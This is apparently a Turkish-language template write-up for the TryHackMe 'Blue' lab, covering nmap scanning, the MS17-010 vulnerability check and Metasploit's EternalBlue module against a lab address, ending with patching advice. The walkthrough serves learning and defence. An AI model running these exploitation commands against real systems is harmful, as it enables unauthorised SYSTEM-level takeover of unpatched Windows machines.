# Blue — TryHackMe

> Bu bir örnek şablondur. Kendi writeup'ını yazarken bu dosyayı kopyalayıp içeriğini değiştir.

**Zorluk:** Kolay · **Konu:** Windows, SMB, EternalBlue

## Özet

Hedef makinede SMB servisindeki bir zafiyet (MS17-010 / EternalBlue) kullanılarak
sistem üzerinde uzaktan kod çalıştırıldı ve SYSTEM yetkisi elde edildi.

## 1. Keşif (Recon)

Önce açık portları tarıyoruz:

```bash
nmap -sV -sC -oN nmap.txt 10.10.10.10
```

Çıktıda 445/tcp (SMB) portunun açık olduğunu görüyoruz.

## 2. Zafiyet Tespiti

SMB'nin EternalBlue'ya karşı zafiyetli olup olmadığını kontrol ediyoruz:

```bash
nmap -p445 --script smb-vuln-ms17-010 10.10.10.10
```

| Alan | Değer |
|------|-------|
| Zafiyet | MS17-010 |
| Durum | VULNERABLE |

## 3. Sömürü (Exploitation)

Metasploit ile ilgili modülü kullanıyoruz:

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
run
```

Bağlantı geldikten sonra `whoami` çıktısı:

```
nt authority\system
```

## Sonuç

- SMB servisleri güncel tutulmalı ve MS17-010 yaması uygulanmalı.
- Gereksiz SMBv1 devre dışı bırakılmalı.

## Kullanılan Araçlar

`nmap`, `metasploit`, `smbclient`
